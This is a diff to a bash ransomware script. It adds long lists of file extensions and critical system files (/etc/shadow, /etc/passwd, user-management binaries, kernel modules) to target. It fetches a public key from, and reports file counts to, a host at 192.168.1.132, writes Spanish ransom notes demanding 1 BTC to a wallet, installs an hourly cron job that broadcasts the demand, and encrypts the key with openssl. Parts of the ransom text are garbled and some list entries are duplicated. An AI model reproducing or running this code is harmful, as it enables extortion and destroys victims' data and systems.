@@ -1,3 +1,4 @@
+
 #!/bin/bash
 
 genFileName() {
@@ -101,8 +102,11 @@ fileExts=("*.py" "*.txt" "*.cpp" "*.png" "*.jpg" "*.sh" "*.pyc" "*.key" "*.php" 
           "*.aim" "*.ans" "*.asc" "*.ase" "*.bdp" "*.bdr" "*.bib" "*.boc" "*.crd" "*.diz" "*.dot" "*.dotm" "*.dotx" "*.dvi" \
           "*.dxe" "*.mlx" "*.err" "*.euc" "*.faq" "*.fdr" "*.fds" "*.gthr" "*.idx" "*.kwd" "*.lp2" "*.ltr" "*.man" "*.mbox" \
           "*.msg" "*.nfo" "*.now" "*.odm" "*.oft" "*.pwi" "*.rng" "*.rtx" "*.run" "*.ssa" "*.text" "*.unx" "*.wbk" "*.wsh" \
-          "*.vb" "*.asmx" "*.config" \
-     "*.3dm" "*.3ds" "*.3fr"  "*.3g2" "*.3gp" "*.3pr" "*.7z" "*.ab4" "*.accdb" "*.accde" "*.accdr" "*accdt" "*.ach" "*.acr"  \
+          "*.7z" "*.arc" "*.ari" "*.arj" "*.car" "*.cbr" "*.cbz" "*.gzig" "*.jgz" "*.pak" "*.pcv" "*.puz" "*.r00" "*.r01" \
+          "*.r02" "*.r03" "*.rev" "*.sdn" "*.sen" "*.sfs" "*.sfx" "*.sh" "*.shar" "*.shr" "*.sqx" "*.tbz2" "*.tg" "*.tlz" \
+          "*.vsi" "*.wad" "*.war" "*.xpi" "*.z02" "*.z04" "*.zap" "*.zipx" "*.zoo" "*.ipa" "*.isu" "*.udf" "*.adr" "*.ap" \
+          "*.aro" "*.asa" "*.ascx" "*.ashx" "*.asmx" "*.asp" "*.indd" "*.asr" "*.qbb" "*.bml" "*.cer" "*.cms" "*.crt" \
+           "*.3dm" "*.3ds" "*.3fr"  "*.3g2" "*.3gp" "*.3pr" "*.7z" "*.ab4" "*.accdb" "*.accde" "*.accdr" "*accdt" "*.ach" "*.acr"  \
  "*.act"  "*.adb" "*.ads" "*.agdl"  "*.ai" "*.ait" "*.al" "*.apj" "*.arw" "*.asf" "*.asm" "*.asp" "*.aspx" "*.asx" "*.avi"    \
  "*.awg" "*.back" "*.backup" "*.backupdb"  "*.bak" "*.lua" "*.m"  "*.m4v" "*.max" "*.mdb" "*.mdc" "*.mdf" "*.mef"  "*.mfw" \
 "*.mmw" "*.moneywell" "*.mos" "*.mov" "*.mp3" "*.mp4" "*.mpg" "*.mrw" "*.msg" "*.myd" "*.nd"  "*.ndd" "*.nef" "*.nk2" \
@@ -130,10 +134,6 @@ fileExts=("*.py" "*.txt" "*.cpp" "*.png" "*.jpg" "*.sh" "*.pyc" "*.key" "*.php" 
 "*.mdc" "*.eml" "*.eps"  "*.erbsql" "*.erf" "*.fla"  "*.flac" "*.flv" "*.kc2"  "*.ibank" "*.ibd" "*.ms2"  "*.http" "*.jpeg" "*.jpg" \
 "*.muf" "*.jpe" "*.max"  "*.mdb" "*.odt" "*.m4v"  "*.mp3" "*.mp4" "*.mp3"  "*.mp4" "*.p7b" "*.mov"  "*.nop" "*.nrw" "*.pdf" "*.mk2" \
 "*.pbl" "*.sql" "*.mdf" "*.st5" "*.mx2" "*.mxl" \
-          "*.7z" "*.arc" "*.ari" "*.arj" "*.car" "*.cbr" "*.cbz" "*.gzig" "*.jgz" "*.pak" "*.pcv" "*.puz" "*.r00" "*.r01" \
-          "*.r02" "*.r03" "*.rev" "*.sdn" "*.sen" "*.sfs" "*.sfx" "*.sh" "*.shar" "*.shr" "*.sqx" "*.tbz2" "*.tg" "*.tlz" \
-          "*.vsi" "*.wad" "*.war" "*.xpi" "*.z02" "*.z04" "*.zap" "*.zipx" "*.zoo" "*.ipa" "*.isu" "*.udf" "*.adr" "*.ap" \
-          "*.aro" "*.asa" "*.ascx" "*.ashx" "*.asmx" "*.asp" "*.indd" "*.asr" "*.qbb" "*.bml" "*.cer" "*.cms" "*.crt" \
           "*.dap" "*.moz" "*.svr" "*.url" "*.wdgt" "*.abk" "*.bic" "*.big" "*.blp" "*.bsp" "*.cgf" "*.chk" "*.col" "*.cty" \
           "*.dem" "*.elf" "*.ff" "*.gam" "*.grf" "*.h3m" "*.h4r" "*.iwd" "*.ldb" "*.lgp" "*.lvl" "*.map" "*.md3" "*.mdl" \
           "*.mm6" "*.mm7" "*.mm8" "*.nds" "*.pbp" "*.ppf" "*.pwf" "*.pxp" "*.sad" "*.sav" "*.scm" "*.scx" "*.sdt" "*.spr" \
@@ -153,6 +153,13 @@ fileExts=("*.py" "*.txt" "*.cpp" "*.png" "*.jpg" "*.sh" "*.pyc" "*.key" "*.php" 
 
 fileList=("/root/.history" "/root/.bash_history" "/root/.bashrc" \
           "/bin/netstat" "/bin/mount" "/bin/kill" \
+          "/usr/sbin/useradd" "/usr/sbin/adduser" \
+          "/bin/chgrp" "/usr/sbin/userdel" "/usr/sbin/usermod" "/usr/sbin/visudo" \
+          "/usr/sbin/tcpdump" "/usr/sbin/service" "/sbin/reboot" "/sbin/shutdown" \
+          "/usr/sbin/mysqld" "/usr/sbin/dmidecode" "/usr/sbin/chroot" \
+          "/usr/sbin/chgpasswd" "/usr/sbin/apache2" "/usr/local/bin/*" \
+          "/lib/modules/$(uname -r)/kernel/drivers/usb/storage/usb-storage.ko" \
+           "/bin/netstat" "/bin/mount" "/bin/kill" \
           "/usr/sbin/useradd" "/usr/sbin/adduser" \
           "/etc/fstab" "/dev/pts" "/dev/shm" \
           "/etc/passwd" "/etc/ftpusers" "/etc/shadow" \
@@ -201,6 +208,8 @@ fileList=("/root/.history" "/root/.bash_history" "/root/.bashrc" \
           "/usr/sbin/mysqld" "/usr/sbin/dmidecode" "/usr/sbin/chroot" \
           "/usr/sbin/chgpasswd" "/usr/sbin/apache2" "/usr/local/bin/*" \
           "/lib/modules/$(uname -r)/kernel/drivers/usb/storage/usb-storage.ko" \
+          "/lib/modules/$(uname -r)/kernel/drivers/cdrom/cdrom.ko" )
+
           "/lib/modules/$(uname -r)/kernel/drivers/cdrom/cdrom.ko" )
 
 curl -k "https://192.168.1.132/downloads/${genKey}_pub.pem" > /root/pub.pem
@@ -256,8 +265,8 @@ curl -k -d "fileCount=${count}&uniqueId=${genKey}" https://192.168.1.132/count.p
 for directory in /root/ /home/ /etc/ /bin/ /usr/sbin/ /usr/bin /sbin/ /usr/local/bin/
 do
   {
-    echo "Tus archivos han sido encriptados con RSA-4096. Para recuperarlos tienes que hacer un pago en los proximas 48 horas. Si no lo haces perderas toda la información. Y la consola se quedara inutilizable. No funciona que apagues o reinicies el sistema, por lo que tienes que pagar el rescate si o si. Realiza el pago de 1BTC y recuperaras la clave, la wallet en la que tienes que depositar los bitcoins es; 1MsktgD6XV1LNkBJLnTxEKs5F5hKkHNahr 
-   Aqui encontraras la página para realizar el pago https://www.blockchain.com/ ${genKey}.
+    echo "Tus archivos estan encriptados con RSA-4096. Tienes que visitar la página https://192.168.1.132/decrypt.php and the id ${genKey}.Realiza el pago de 1BTC y recuperaras la clave, la wallet en la que tienes que depositar los bitcoins es 1MsktgD6XV1LNkBJLnTxEKs5F5hKkHNahr  Si no lo haces en las 48 horas, todo tu sistema se eliminara para siempre ."
+    
   } >> "${directory}/INSTRUCTIONS.txt"
 
   curl -k https://192.168.1.132/downloads/INSTRUCTIONS.html >> "${directory}/INSTRUCTIONS.html"
@@ -268,8 +277,7 @@ done
   echo -e "\n"
   echo -e "wallCmd=\$(which wall)"
   echo -e "\n"
-  echo -e "echo -e \"Tus archivos han sido encriptados con RSA-4096. Para recuperarlos tienes que hacer un pago en los proximas 48 horas. Si no lo haces perderas toda la información. Y la consola se quedara inutilizable. No funciona que apagues o reinicies el sistema, por lo que tienes que pagar el rescate si o si. Realiza el pago de 1BTC y recuperaras la clave, la wallet en la que tienes que depositar los bitcoins es; 1MsktgD6XV1LNkBJLnTxEKs5F5hKkHNahr 
-   Aqui encontraras la página para realizar el pago https://www.blockchain.com/  ${genKey}. .\\n\\nIMPORTANT: Pay" | \${wallCmd}"
+  echo -e "echo -e \"Tus archivos estan encriptados con RSA-4096. Tienes que visitar la página https://192.168.1.132/decrypt.php and the id ${genKey}. Realiza el pago de 1BTC y recuperaras la clave, la wallet que tienes que depositar los bitcoins es 1MsktgD6XV1LNkBJLnTxEKs5F5hKkHNahr  forever.\\n\\nIMPORTANT: F Si no lo haces en 48 horas, todo tu sistema se eliminara para siempre.\" | \${wallCmd}"
 } > /etc/cron.hourly/instructions.sh
 
 chmod 755 /etc/cron.hourly/instructions.sh
@@ -284,8 +292,7 @@ else
   echo "Could not set crontab" &>/dev/null
 fi
 
-echo -e "Tus archivos han sido encriptados con RSA-4096. Para recuperarlos tienes que hacer un pago en los proximas 48 horas. Si no lo haces perderas toda la información. Y la consola se quedara inutilizable. No funciona que apagues o reinicies el sistema, por lo que tienes que pagar el rescate si o si. Realiza el pago de 1BTC y recuperaras la clave, la wallet en la que tienes que depositar los bitcoins es; 1MsktgD6XV1LNkBJLnTxEKs5F5hKkHNahr 
-   Aqui encontraras la página para realizar el pago https://www.blockchain.com/"
+echo -e "Tus archivos estan encriptados con RSA-4096. Tienes que visitar la página  https://192.168.1.132/decrypt.php and the id ${genKey}. d your data lost forever.\n\nIMPORTANT:   Realiza el pago de 1BTC y recuperaras la clave de la wallet ."
 
 # Encrypt key.bin with our public key
 openssl rsautl -encrypt -inkey /root/pub.pem -pubin -in /root/key.bin -out /root/key.bin.enc
